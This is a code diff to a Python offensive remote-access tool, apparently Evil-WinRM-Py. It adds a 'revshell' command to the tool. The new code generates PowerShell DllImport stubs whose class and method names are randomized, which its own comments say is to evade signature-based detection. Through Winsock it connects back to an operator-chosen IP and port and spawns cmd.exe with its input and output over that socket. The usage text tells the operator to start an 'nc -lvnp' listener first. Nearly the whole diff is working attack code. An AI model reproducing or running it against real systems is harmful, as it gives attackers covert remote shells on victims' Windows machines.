@@ -13,6 +13,7 @@ import json
 import logging
 import os
 import re
+import shlex
 import shutil
 import signal
 import sys
@@ -21,7 +22,9 @@ import textwrap
 import time
 import traceback
 from importlib import resources
+from ipaddress import ip_address
 from pathlib import Path
+from random import randbytes, randint
 
 from prompt_toolkit import PromptSession, prompt
 from prompt_toolkit.completion import Completer, Completion
@@ -84,6 +87,10 @@ MENU_COMMANDS = {
         "syntax": "runexe <local_path>.exe [args]",
         "info": "Upload and execute (in-memory) a local EXE on the remote host",
     },
+    "revshell": {
+        "syntax": "revshell <IP> <PORT>",
+        "info": "Spawn a reverse shell to IP:PORT with stdin/stdout/stderr redirected",
+    },
     "menu": {
         "syntax": "menu",
         "info": "Show this menu",
@@ -98,6 +105,70 @@ MENU_COMMANDS = {
     },
 }
 COMMAND_SUGGESTIONS = []
+
+# --- Revshell DLL Import Helpers ---
+# Namespace for dynamically generated types (randomized to evade detection)
+_revshell_ns = "A" + randbytes(randint(3, 8)).hex()
+
+# Storage for generated import statements and call signatures
+_revshell_imports = {}
+_revshell_calls = {}
+
+
+def _dll_import(ns: str, lib: str, fun: str, sigs: list[str]) -> None:
+    """
+    Generate obfuscated PowerShell Add-Type statements for DLL imports.
+    This creates randomized class and method names to evade signature-based detection.
+
+    Args:
+        ns: Namespace for the generated type
+        lib: DLL name (e.g., "kernel32", "ws2_32")
+        fun: Function name to import (e.g., "CreateProcess", "WSASocket")
+        sigs: List of type signatures [return_type, arg1_type, arg2_type, ...]
+    """
+    cls = f"f{randbytes(randint(3, 8)).hex()}"
+    name = f"g{randbytes(randint(3, 8)).hex()}"
+    ret = sigs[0]
+    args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
+    dll = "+".join(f'"{c}"' for c in lib)
+    entry = "+".join(f'"{c}"' for c in fun)
+    code = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
+    _revshell_calls[fun] = f"[{ns}.{cls}]::{name}"
+    _revshell_imports[fun] = f"""Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"""
+
+
+# Generate DLL imports for revshell functionality
+_dll_import(
+    _revshell_ns,
+    "kernel32",
+    "CreateProcess",
+    [
+        "IntPtr",
+        "IntPtr",
+        "string",
+        "IntPtr",
+        "IntPtr",
+        "bool",
+        "uint",
+        "IntPtr",
+        "IntPtr",
+        "Int64[]",
+        "byte[]",
+    ],
+)
+_dll_import(_revshell_ns, "ws2_32", "WSAStartup", ["IntPtr", "short", "byte[]"])
+_dll_import(
+    _revshell_ns,
+    "ws2_32",
+    "WSASocket",
+    ["IntPtr", "uint", "uint", "uint", "IntPtr", "uint", "uint"],
+)
+_dll_import(
+    _revshell_ns,
+    "ws2_32",
+    "WSAConnect",
+    ["IntPtr", "IntPtr", "byte[]", "int", "IntPtr", "IntPtr", "IntPtr", "IntPtr"],
+)
 
 # --- Colors ---
 # ANSI escape codes for colored output
@@ -141,6 +212,27 @@ class DelayedKeyboardInterrupt:
         if self.signal_received:
             # raise the signal after the task is done
             self.old_handler(*self.signal_received)
+
+
+def split_args(cmdline: str) -> list[str]:
+    """
+    Split a command line string into arguments, handling quoted strings properly.
+    This is used for parsing revshell command arguments.
+    """
+    try:
+        args = shlex.split(cmdline, posix=False)
+    except ValueError:
+        return []
+
+    fixed = []
+    for arg in args:
+        if arg.startswith('"') and arg.endswith('"'):
+            fixed.append(arg[1:-1])
+        elif arg.startswith("'") and arg.endswith("'"):
+            fixed.append(arg[1:-1])
+        else:
+            fixed.append(arg)
+    return fixed
 
 
 def run_ps_cmd(r_pool: RunspacePool, command: str) -> tuple[str, list, bool]:
@@ -1150,6 +1242,88 @@ def run_exe(r_pool: RunspacePool, local_path: str, args: str = "") -> None:
             ps.stop()
 
 
+def revshell(r_pool: RunspacePool, target_ip: str, target_port: int) -> None:
+    """
+    Spawn a reverse shell on the remote host that connects back to the specified IP:PORT.
+
+    This creates a cmd.exe process with stdin/stdout/stderr redirected through a socket
+    connection to the attacker's machine. Uses Windows Socket API (Winsock2) via
+    dynamically loaded DLL imports.
+
+    Args:
+        r_pool: The RunspacePool for executing PowerShell commands
+        target_ip: IP address to connect back to
+        target_port: Port to connect back to
+    """
+    try:
+        # Parse and validate IP address, convert to packed bytes
+        ip = ip_address(target_ip).packed
+        # Split port into high and low bytes (network byte order / big-endian)
+        p_hi, p_lo = (target_port >> 8) & 0xFF, target_port & 0xFF
+    except Exception as e:
+        print(RED + f"[-] Invalid IP address or port: {e}" + RESET)
+        log.error(f"Invalid IP address or port: {e}")
+        return
+
+    print(BLUE + f"[*] Spawning reverse shell to {target_ip}:{target_port}..." + RESET)
+    log.info(f"Spawning reverse shell to {target_ip}:{target_port}")
+
+    # Build the PowerShell commands for the reverse shell
+    # 1. Import DLL functions (WSAStartup, WSASocket, WSAConnect, CreateProcess)
+    # 2. Initialize Winsock
+    # 3. Create a TCP socket
+    # 4. Connect to the attacker's IP:PORT
+    # 5. Create STARTUPINFO structure with socket handles for stdin/stdout/stderr
+    # 6. Spawn cmd.exe with redirected I/O
+    commands = [
+        # Import the required DLL functions
+        _revshell_imports["WSAStartup"],
+        _revshell_imports["WSASocket"],
+        _revshell_imports["WSAConnect"],
+        _revshell_imports["CreateProcess"],
+        # Initialize Winsock 2.2
+        f"{_revshell_calls['WSAStartup']}(0x202,(New-Object byte[] 64))",
+        # Create TCP socket: AF_INET(2), SOCK_STREAM(1), IPPROTO_TCP(6)
+        f"$sock = {_revshell_calls['WSASocket']}(2,1,6,0,0,0)",
+        # Connect to target: sockaddr_in structure as byte array
+        # [AF_INET(2), 0, port_hi, port_lo, ip[0], ip[1], ip[2], ip[3], padding...]
+        f"{_revshell_calls['WSAConnect']}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},0,0,0,0,0,0,0,0),16,0,0,0,0)",
+        # Create STARTUPINFO structure:
+        # cb=104, dwFlags=STARTF_USESTDHANDLES(0x100), hStdInput/Output/Error = socket
+        f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
+        # CreateProcess: spawn cmd.exe with socket-redirected I/O
+        f"{_revshell_calls['CreateProcess']}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
+        # Clean up variables
+        f"Remove-Variable @('sock','sinfo')",
+    ]
+
+    try:
+        for cmd in commands:
+            log.debug(f"Executing revshell command: {cmd}")
+            ps = PowerShell(r_pool)
+            ps.add_cmdlet("Invoke-Expression").add_parameter("Command", cmd)
+            ps.add_cmdlet("Out-String").add_parameter("Stream")
+            ps.begin_invoke()
+
+            while ps.state == PSInvocationState.RUNNING:
+                with DelayedKeyboardInterrupt():
+                    ps.poll_invoke()
+
+            if ps.streams.error:
+                for error in ps.streams.error:
+                    print(RED + error._to_string + RESET)
+                    log.error("Error: {}".format(error._to_string))
+
+        print(
+            GREEN + f"[+] Reverse shell spawned. Check your listener at {target_ip}:{target_port}" + RESET
+        )
+        log.info(f"Reverse shell spawned to {target_ip}:{target_port}")
+
+    except KeyboardInterrupt:
+        print(RED + "\n[-] Reverse shell setup interrupted." + RESET)
+        log.info("Reverse shell setup interrupted by user.")
+
+
 def interactive_shell(r_pool: RunspacePool) -> None:
     """Runs the interactive pseudo-shell."""
     log.info("Starting interactive PowerShell session...")
@@ -1354,6 +1528,33 @@ def interactive_shell(r_pool: RunspacePool) -> None:
                 args = " ".join(command_parts[2:]) if len(command_parts) > 2 else ""
 
                 run_exe(r_pool, local_path, args)
+                continue
+            elif command_lower.startswith("revshell"):
+                command_parts = split_args(command[len("revshell "):].strip())
+                if len(command_parts) < 2:
+                    print(RED + "[-] Usage: revshell <IP> <PORT>" + RESET)
+                    print(
+                        CYAN
+                        + "[*] Spawns a reverse shell with stdin/stdout/stderr redirected to your listener."
+                        + RESET
+                    )
+                    print(
+                        CYAN
+                        + "[*] Start a listener first: nc -lvnp <PORT>"
+                        + RESET
+                    )
+                    continue
+
+                target_ip = command_parts[0]
+                try:
+                    target_port = int(command_parts[1])
+                    if not (1 <= target_port <= 65535):
+                        raise ValueError("Port out of range")
+                except ValueError:
+                    print(RED + f"[-] Invalid port: {command_parts[1]}. Must be 1-65535." + RESET)
+                    continue
+
+                revshell(r_pool, target_ip, target_port)
                 continue
             else:
                 try:
@@ -1653,3 +1854,7 @@ def main():
         sys.exit(1)
     finally:
         log.info("--- Evil-WinRM-Py v{} ended ---".format(__version__))
+
+
+if __name__ == "__main__":
+    main()
